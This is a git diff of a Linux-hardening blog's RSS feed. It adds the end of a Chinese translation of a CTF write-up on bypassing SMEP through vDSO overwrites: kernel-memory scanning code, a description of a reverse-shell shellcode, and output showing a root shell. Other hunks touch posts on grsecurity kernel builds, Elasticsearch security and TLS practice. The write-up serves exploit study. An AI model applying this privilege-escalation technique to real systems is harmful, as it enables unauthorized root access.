+        &lt;span class=&quot;na&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;oom&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;vdso_pages&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;copy_page&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;page_address&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;vdso_start&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;PAGE_SIZE&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;vbase =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;vmap(vdso_pages,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;npages&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;PAGE_KERNEL&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;所以在内核空间中通过alloc_page分配了vDSO页，并且指针保存在了vdso_pages数组中。只有少数的几种方法能够定位这些页。如果能够读取/proc/kallsyms，你将能够通过vdso_pages直接获取这些地址。然而，这种情况在这次比赛不适用。第二种方法则是在内核空间中搜寻每一个页的开头，看是否有ELF头也出现了部分vDSO的映射。我们可以通过vDSO的标志(signatures)进一步缩小这些页的范围。下面是实现这个思路的代码：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;void* header = 0;
+void* loc = 0xffffffff80000000;
+size_t i = 0;
+for (; loc&lt;span class=&quot;nt&quot;&gt;&amp;lt;0xffffffffffffafff&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;loc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;readMem&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&amp;amp;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;header=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;=0x010102464c457f)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&amp;quot;%&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;quot;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;readMem&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&amp;amp;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;0x270&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;err&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Look&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;clock_ge&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;signature&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;may&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;be&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;at&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;but&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;happened&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;header=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;=0x65675f6b636f6c63)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;,&amp;quot;%&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;found&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;?\&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;quot;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;na&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;现在我们找到了vDSO所在的区域，我们就能用shellcode来覆盖它。&lt;/p&gt;
+
+&lt;h2 id=&quot;shellcode&quot;&gt;反弹shellcode&lt;/h2&gt;
+
+&lt;p&gt;此处用到的反弹shellcode和常见的x86-64 shellcode差不多，但有几个修改的地方。第一个修改为：只为root进程创建反弹shell。因为每一个调用gettimeofday的进程都会触发我们的shellcode，我们不需要那些没有root权限的进程的shell权限。我们可以通过调用 0x66(sys_getuid)系统调用并将其与0进行比较。如果没有root权限，我们继续调用0x66(sys_gettimeofday)系统调用，所以其他没有不相关的进程也不会受到太多影响。但同样在root进程当中，我们不想造成更多的问题，我们将通过0x39系统调用 fork一个子进程，父进程继续执行sys_gettimeofday，而由子进程来执行反弹shell。&lt;/p&gt;
+
+&lt;p&gt;我所使用的shellcode的汇编代码可以在&lt;a href=&quot;https://gist.github.com/itsZN/1ab36391d1849f15b785&quot;&gt;这里&lt;/a&gt;。它将连接到127.0.0.1:3333并执行”/bin/sh”&lt;/p&gt;
+
+&lt;p&gt;我们要做的最后一件事则是，dump vDSO并在gettimeofday所在的偏移处检查。只要我们知道我们可以在这个位置覆盖上shellcode，我们就可以在这等待某个进程进行调用。我设置了一个简单的cron任务来完成这个任务(root进程调用gettimeofday)。我最后的代码可以在&lt;a href=&quot;https://gist.github.com/itsZN/20144eb7beefbc301bcf&quot;&gt;这里&lt;/a&gt;找到。下面是程序运行的情况：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;csaw@team7:~$ id
+uid=1000(csaw) gid=1000(csaw) groups=1000(csaw)
+csaw@team7:~$ ./a.out 
+allocate fd: 3 ret: 0 id:1
+Shrink: 0 err:0
+ZERO_SIZED_POINTER = 0x10
+0xffffffff817bc000 elf
+0xffffffff817d1000 elf
+0xffffffff81b6c000 elf
+0xffffffff81b9e000 elf
+0xffffffff81c03000 elf
+0xffffffff81c03000 found it?
+Listening on [0.0.0.0] (family 0, port 3333)
+Connection from [127.0.0.1] port 3333 [tcp/*] accepted (family 2, sport 58568)
+id
+uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;final-notes&quot;&gt;Final Notes&lt;/h2&gt;
+
+&lt;p&gt;vDSO不是唯一一个同时映射在内核空间和用户空间的内存。在x86-64当中,vSYSCALL与vDSO实现类是的功能，但多了一点特性就是每次重启都在同一个位置（可能可以通过内核版本进行预测）。然而 kernel.vsyscall64并没有在本次比赛启用，所以我们将通过vDSO来完成这个目的。如果vm.vdso_enable设置为0，vDSO也会被绕过并且libc的wrapper function会默认调用正常的系统调用。&lt;/p&gt;
+
+&lt;p&gt;vDSO/vSYSCALL overwriting是一个非常有用的技术，它能够用在对于中断上下文(interrupt context)的利用，因为它不需要本地进程来映射一段内存，或者提升权限。&lt;/p&gt;
+
+&lt;p&gt;在解决这个问题当中本文提到的解决思路也不是唯一的，另外一个解决思路可以在&lt;a href=&quot;https://github.com/mncoppola/StringIPC/blob/master/solution/solution.c&quot;&gt;这里&lt;/a&gt;找到&lt;/p&gt;
+</description>
+        <pubDate>Wed, 25 Nov 2015 11:30:02 +0800</pubDate>
+        <link>http://www.hardenedlinux.org/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html</link>
+        <guid isPermaLink="true">http://www.hardenedlinux.org/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html</guid>
+        
+        
+        <category>translation</category>
+        
+      </item>
     
       <item>
         <title>Timeline of compulsory routers</title>
@@ -149,7 +847,7 @@ apt-get update
 &lt;pre&gt;&lt;code&gt;apt-get install sudo
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;修改sudoers文件，添加一句（等效于添加当前用户到sudo用户组，或者直接使用root用户可忽略此步）:&lt;/p&gt;
+&lt;p&gt;修改sudoers文件，添加一句（等效于添加当前用户到sudo用户组，或者直接使用root用户可忽略此步）:   &lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt; nano /etc/sudoers
  add &quot;user   ALL=(ALL:ALL)ALL&quot;
@@ -271,7 +969,7 @@ Customer Configuration中进行更细致的加固措施的划分，二者效果�
 
 &lt;p&gt;14)完成之后执行编译内核命令，这一步需要较长时间&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;make deb-pkg -j'cpu核心数+1' 
+&lt;pre&gt;&lt;code&gt;make deb-pkg -j&#39;cpu核心数+1&#39; 
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;15）编译之后安装：&lt;/p&gt;
@@ -334,9 +1032,9 @@ sudo make install
 
 &lt;p&gt;19)	卸载旧内核(&lt;em&gt;Note：dpkg确定内核版本号，remove掉相应的内核deb包，请替换后再执行命令&lt;/em&gt;)&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;dpkg -l | grep linux-headers（若没有3.16的headers则可略去下面的apt-get remove linux-headers-''）
+&lt;pre&gt;&lt;code&gt;dpkg -l | grep linux-headers（若没有3.16的headers则可略去下面的apt-get remove linux-headers-&#39;&#39;）
 dpkg -l | grep linux-image
-sudo apt-get remove linux-headers-'' linux-image-''(注意：这一步使用前两个命令得到的信息替换''里的内容）
+sudo apt-get remove linux-headers-&#39;&#39; linux-image-&#39;&#39;(注意：这一步使用前两个命令得到的信息替换&#39;&#39;里的内容）
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;此时再重启计算机会发现现在只有Linux 3.14.48-grsec的内核了。&lt;/p&gt;
@@ -498,12 +1196,12 @@ sudo weave expose 10.0.0.254/24
 
 &lt;p&gt;现在可以尝试着用RESTFUL API来访问ElasticSearch，会发现访问被拒绝&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;curl -XGET 'http://localhost:9200/'
+&lt;pre&gt;&lt;code&gt;curl -XGET &#39;http://localhost:9200/&#39;
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;在请求上加上用户名和密码即可：&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;curl -u es_admin -XGET 'http://localhost:9200/'
+&lt;pre&gt;&lt;code&gt;curl -u es_admin -XGET &#39;http://localhost:9200/&#39;
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;由此可知，使用Shield新建ES账户后，可以为ES添加严格个安全认证机制。&lt;/p&gt;
@@ -555,19 +1253,19 @@ sudo weave expose 10.0.0.254/24
 admin:
   cluster: all
   indices:
-    '*': all
+    &#39;*&#39;: all
 
 # Monitoring cluster privileges
 # All operations on all indices
 power_user:
   cluster: monitor
   indices:
-    '*': all
+    &#39;*&#39;: all
 
 # Only read operations on indices named events_*
 events_user:
   indices:
-    'events_*': read
+    &#39;events_*&#39;: read
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;具体的Privileges请参见：&lt;a href=&quot;http://&quot;&gt;https://www.elastic.co/guide/en/shield/current/reference.html#ref-actions-list&lt;/a&gt;&lt;/p&gt;
@@ -636,7 +1334,7 @@ vim roles.yml
 
 &lt;pre&gt;&lt;code&gt;Data_user: #Data_user 角色定义
   indices:  #index部分
-    '*': crub  #指定Data_user可以读写所有indices
+    &#39;*&#39;: crub  #指定Data_user可以读写所有indices
 
 Server_user:  #Serve_user 角色定义
   cluster: cluster:admin/nodes/restart, cluster:admin/nodes/shutdown
@@ -1855,608 +2553,6 @@ https://community.qualys.com/blogs/securitylabs/2014/12/08/poodle-bites-tls&lt;/
 http://www.isg.rhul.ac.uk/tls/Lucky13.html&lt;/p&gt;
 </description>
         <pubDate>Wed, 29 Jul 2015 01:59:07 +0800</pubDate>
-        <link>http://www.hardenedlinux.org/cryptography/2015/07/29/trusting-trust.html</link>
-        <guid isPermaLink="true">http://www.hardenedlinux.org/cryptography/2015/07/29/trusting-trust.html</guid>
-        
-        
-        <category>cryptography</category>
-        
-      </item>
-    
-      <item>
-        <title>SSL/TLS部署最佳实践v1.4</title>
-        <description>&lt;p&gt;译者：Shawn the R0ck( 1.3), Tom Li( 1.4)&lt;/p&gt;
-
-&lt;p&gt;Reviewers: Lenx Wei&lt;/p&gt;
-
-&lt;p&gt;原文：&lt;a href=&quot;https://www.ssllabs.com/downloads/SSL_TLS_Deployment_Best_Practices.pdf&quot;&gt;SSL/TLS Deployment Best Practices&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;作者：Ivan Ristić&lt;/p&gt;
-
-&lt;p&gt;version 1.4 (8 December 2014)&lt;/p&gt;
-
-&lt;p&gt;Copyright © 2012-2014 Qualys SSL Labs&lt;/p&gt;
-
-&lt;h2 id=&quot;section&quot;&gt;摘要：&lt;/h2&gt;
-
-&lt;p&gt;SSL/TLS是一个看似简单的技术。非常容易部署和让她跑起来，但是…她真的跑
-起来了吗？第一部分是真的 —— SSL确实容易部署 —— 然而正确部属她并不容易。
-为了确保TLS提供安全性，系统管理员和开发者必须投入额外的精力，去配置服务器和
-编写应用程序。&lt;/p&gt;
-
-&lt;p&gt;2009年，我们在&lt;a href=&quot;https://www.ssllabs.com/&quot;&gt;SSL Labs&lt;/a&gt;开始了相关工作，因为我
-们想明白TLS到底是在怎么样被使用，我们也打算弥补TLS缺乏易用的工具和文档
-的局面。我们进行了对全局TLS使用情况的完整调查，以及实现了在线检测工具，但文
-档缺乏的问题依然存在。这份文档是解决这个问题过程中的一步。&lt;/p&gt;
-
-&lt;p&gt;我们的目标是让已经不堪负重的系统管理员和程序员尽可能花费少量时间就能完
-成安全站点或Web应用的部署，正是因为我们的目的如此，所以这份文档可能不够完备，遗漏了
-一些高级主题。因此，我们只提供简单实用容易理解的建议。
-对于那些想了解更多信息的读者，可以看看 Section 6。&lt;/p&gt;
-
-&lt;h2 id=&quot;section-1&quot;&gt;1. 私钥和证书&lt;/h2&gt;
-
-&lt;p&gt;TLS提供的安全质量完全依赖于私钥和证书。私钥是安全的基础，而证书则用于向访问者表明
-服务器的身份。&lt;/p&gt;
-
-&lt;h3 id=&quot;section-2&quot;&gt;1.1 使用2048位的私钥&lt;/h3&gt;
-
-&lt;p&gt;在你的所有服务器上使用2048位的RSA，或者等价强度的256位ECDSA私钥。密钥的强度能
-保证在相当长时间内的安全，如果你已经使用1024位的RSA，尽快替换它们。如果你
-的安全需求必须使用大于2048位的密钥，请考虑ECDSA，因为性能不错。不过ECDSA的缺点
-是小部分客户端不支持，因此你有可能需要同时部署RSA和ECDSA以确保互操作性。&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Lenx注：RSA 1024的强度相当于分组加密的80-96bit，已经被视为不安全。[T1]&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;section-3&quot;&gt;1.2 保护私钥&lt;/h3&gt;
-
-&lt;p&gt;私钥是重要的资产，尽可能限制能接触到私钥的人。推荐策略包括：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;在一台可信的计算机(Shawn注:加固过的物理机器)上生成私钥和CSR(
-Certificate Signing Requests)。有一些CA会为你生成密钥和CSR，但这样做
-明显不妥。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;受密码保护的密钥可以防止从备份系统中泄漏。然而私钥密码在生产系统中使用的
-帮助是有限的，因为这并不能阻止一个聪明的攻击者从进程内存中截获私钥。
-一些硬件设备可以在服务器被攻陷的情况下确保私钥安全，但这些昂贵的设备
-只在对安全有严格要求的机构中使用。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;在发现系统被攻陷后，吊销老的证书，生成新的密钥和证书。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;每年更新证书，同时更新私钥。&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;section-4&quot;&gt;1.3 确保充分的域名覆盖&lt;/h3&gt;
-
-&lt;p&gt;确保你的证书覆盖到目标站点的所有活跃域名。比如你的主站是www.example.com，但
-你可能还有个www.example.net。你的目标就是避免无效证书警告，因为那会让你
-的用户产生疑惑从而影响对你的信任。&lt;/p&gt;
-
-&lt;p&gt;即使你的服务器只有一个主机名配置，也要记得你不能控制用户是通过什么路径
-访问你的站点的，可能是其他的链接过来的。大部分情况下，你应该保证证书能
-在没有www前缀的情况下工作(比如，example.com和www.example.com)。这里经验法则
-就是：一个安全的WEB服务器应该有一个对所有DNS名称解析都合法的证书配置。&lt;/p&gt;
-
-&lt;p&gt;通配符证书(Wildcard certificates)有它的适用场景。但如果这样的配置意味着
-暴露私钥给不必要的人群（特别是在跨越部门边界的情形下），则应该避免使用。
-换句话说，越少的人能访问私钥越好。此外，要意识到共享证书可能会导致安全漏洞
-从一个站点扩散到所有使用相同证书的站点。&lt;/p&gt;
-
-&lt;h3 id=&quot;ca&quot;&gt;1.4 从靠谱的CA那里获得证书&lt;/h3&gt;
-
-&lt;p&gt;选择一个对待安全业务认真可靠的CA( Certificate Authority)。在选择CA过程
-中考虑以下因素：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;对待安全的态度&lt;/p&gt;
-
-    &lt;p&gt;大多的CA都会有常规的安全审计（否则根本没有资格当CA），但是其中一些会更重视
-安全。搞清楚哪些更重视安全不是一件容易的事情，但一个可行的做法
-是看看他们在安全方面的历史状况，他们如何响应攻击事件以及如何从错误中学习。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;足够大的市场占有率&lt;/p&gt;
-
-    &lt;p&gt;满足此因素的CA不太可能轻易撤销所有证书，而这种事情过去曾发生在小的CA身上。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;业务重心&lt;/p&gt;
-
-    &lt;p&gt;如果一家机构的核心业务是CA，那么一旦出现严重问题，他们将会受到严重影响。
-因此这些CA不太可能因为追逐利润而忽视证书部门的重要性。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;提供哪些服务&lt;/p&gt;
-
-    &lt;p&gt;在最底线的情况，你选择的CA至少应该提供CRL( Certificate List)和OCSP(
-Online Certificate Status Protocol)这两种召回机制，并且提供一个高性能的OCSP服务。
-CA至少提供域名验证和扩展证书验证功能，最理想的情况可以让你自己选择公
-钥算法(今天大多站点都使用RSA，但在未来ECDSA的性能优势可能会变得重要。)&lt;/p&gt;
-
-    &lt;blockquote&gt;
-      &lt;p&gt;Shawn注：这里作者可能指的是ECDH/ECDHE_ECDSA，即ECDH密钥交换+ECDSA签名的证书或者ECDH算出TLS的临时session key+ECDSA签名&lt;/p&gt;
-    &lt;/blockquote&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;证书管理选项&lt;/p&gt;
-
-    &lt;p&gt;如果你的运维环境很复杂，需要一大堆的证书，那么选择一个能提供良好管理工具的
-CA。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;技术支持&lt;/p&gt;
-
-    &lt;p&gt;选择一个技术支持优秀的CA提供商。&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;section-5&quot;&gt;1.5 选择强算法签名证书&lt;/h3&gt;
-
-&lt;p&gt;证书签名的安全依赖于签名私钥的强度，以及所使用的哈希函数强度。
-今天大多数证书使用并不足够安全的SHA1哈希函数。业界正在逐渐
-淘汰SHA1，而最后期限则是2016年末，这之后SHA1证书就不可接受了。&lt;/p&gt;
-
-&lt;p&gt;然而，Google Chrome在大限到来之前就开始对SHA1证书发出警告，如果你的证书
-在2015年左右就要到期，你应该立刻替换这些证书。作为替代，你可以直奔SHA2
-算法家族。不过在你动手之前，你需要先看看你的用户是否支持SHA2。一些旧客户
-端，例如 Windows XP SP2 的 IE 6 就不支持（但依然在一些国家和机构重度使用）。&lt;/p&gt;
-
-&lt;h2 id=&quot;section-6&quot;&gt;2. 配置&lt;/h2&gt;
-
-&lt;p&gt;使用正确的TLS服务器配置，才能够确保将你的信任凭证正确的展现给站点的访问者，
-确保只有安全的加密原语被使用，而且确保规避所有已知的安全风险。&lt;/p&gt;
-
-&lt;h3 id=&quot;section-7&quot;&gt;2.1 部署有效的证书链&lt;/h3&gt;
-
-&lt;p&gt;一个无效证书链会导致服务器证书失效和客户端浏览器报警告，这个问题有时候
-不是那么容易被检测到，因为有些浏览器可以自己重构一个完整的信任链而有些
-则不行。&lt;/p&gt;
-
-&lt;p&gt;在绝大多数部署场景中，仅服务器自身一个证书是不够的。一般需要多个证书建立一个信
-任链。一个常见的问题是正确的配置了服务器证书但却忘了包含其他所需要的
-证书。此外，虽然这些其他的证书通常有很长的有效期，但它们也会过期。而且一旦它们过
-期就会使整个信任链作废。你的CA应该向你提供所有额外需要的证书。&lt;/p&gt;
-
-&lt;p&gt;一个无效证书链会导致服务器证书失效，并且导致客户端浏览器报警。而实际上，这个问题有时候
-难以诊断，因为有些浏览器可以自己重构一个完整的信任链而其他浏览器则不行。&lt;/p&gt;
-
-&lt;h3 id=&quot;section-8&quot;&gt;2.2 使用安全的协议&lt;/h3&gt;
-
-&lt;p&gt;在SSL/TLS家族中有5种协议：SSLv2, SSL v3, TLS v1.0, TLS v1.1, TLS v1.2。&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Shawn注: TLS v1.3还在draft阶段&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;SSL v2不安全，坚决不能用。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Shawn注: OpenSSL和GnuTLS当前的版本(2014.12.2)不支持SSL v2&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;SSL v3用于HTTP已经被确认为不安全，用于其他协议时安全强度也不足。
-它已经过时，不应该再被使用。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Tom Li注: POODLE漏洞的出现彻底的废掉了SSLv3，受其影响，
-  大量程序和库彻底取消了对SSLv3的支持。其实之前很多地方支持SSLv3
-  的原因是兼容性问题。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;TLS v1.0在很大程度上是安全的。当用于非HTTP协议时，我们还不知道存在任何
-已知的重大安全漏洞。当用于HTTP协议时，我们能够通过精心的服务器配置，来保证
-它几乎是安全的。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;TLS v1.1和TLS v1.2没有已知的安全漏洞曝光。&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Shawn注: 由于Edward Snowden曝光的内容有关于NSA“今天记录，明天解密”的故事，
-  所以大量的自由软件社区和暗网使者们在过去1年中(2013.7–2014)转向了TLS v1.2的PFS，2015年4月，[PCI-DSS v3.1] (https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-1.pdf)规定所有SSL的版本以及早期TLS版本将于2016年6月30日后不再支持)&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Lenx注：某一些TLS 1.x实现由于没有正确实现对PADDING的校验，同样存在POODLE脆弱性问题。
-  这些有问题的TLS实现包括F5，A10，Checkpoint, Cisco等厂家的设备。
-  同样，Lucky 13攻击一样对老版本的OpenSSL, GnuTLS，F5等大量库/设备实现有效。
-  请确认打上补丁。[T2][T3]&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;TLS v1.2应该成为你的主要协议。这个版本有巨大的优势是因为它有之前版本
-没有的特性。如果你的服务器平台（或中间设备）不支持TLS v1.2，做个升
-级计划吧。如果你的服务提供商不支持TLS v1.2，要求他们升级。&lt;/p&gt;
-
-&lt;p&gt;对于那些老的客户端，你还是需要继续支持TLS v1.0和TLS v1.1。使用临时的解
-决方案（接下来会介绍），这些协议对于大多WEB站点依然被认为是足够安全的。&lt;/p&gt;
-
-&lt;h3 id=&quot;cipher-suite&quot;&gt;2.3 使用安全的加密套件(Cipher Suite)&lt;/h3&gt;
-
-&lt;p&gt;要安全的通信，首先得保证你是和你想通信的另一方直接通信（而不是
-冒充者或者存在能够监听的中间人），并且安全的交换数据。
-在SSL/TLS里，加密套件是定义你如何安全通信的。
-它们由一堆多样化的组件组成，以确保安全。如果其中一个组件被发现是不安全的，
-你应该切换到其他的组件上。&lt;/p&gt;
-
-&lt;p&gt;你的目标应该是仅使用128位或者更强的加密、认证套件，其他都应该被排除掉：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Anonymous Diffie-Hellman (ADH) 套件不提供认证功能&lt;/li&gt;
-  &lt;li&gt;NULL cipher suites不提供加密&lt;/li&gt;
-  &lt;li&gt;出口密钥交换套件 (Export key exchange suites) 使用容易被破解的认证&lt;/li&gt;
